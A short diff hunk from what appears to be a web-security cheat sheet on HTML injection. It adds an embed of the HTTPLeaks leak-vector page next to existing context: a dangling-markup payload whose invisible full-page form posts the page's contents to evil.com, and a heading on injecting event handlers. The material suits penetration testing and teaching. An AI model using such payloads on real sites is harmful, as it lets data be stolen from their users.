@@ -162,6 +162,8 @@ ext:php | ext:asp | ext:aspx | ext:jsp | ext:asp | ext:pl | ext:cfm | ext:py | e
 <noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
 ```
 
+{% embed url="https://raw.githubusercontent.com/cure53/HTTPLeaks/refs/heads/main/leak.html" %}
+
 #### 3) Get your event handler injected
 
 * [Agnostic Event Handlers](https://brutelogic.com.br/blog/agnostic-event-handlers/)
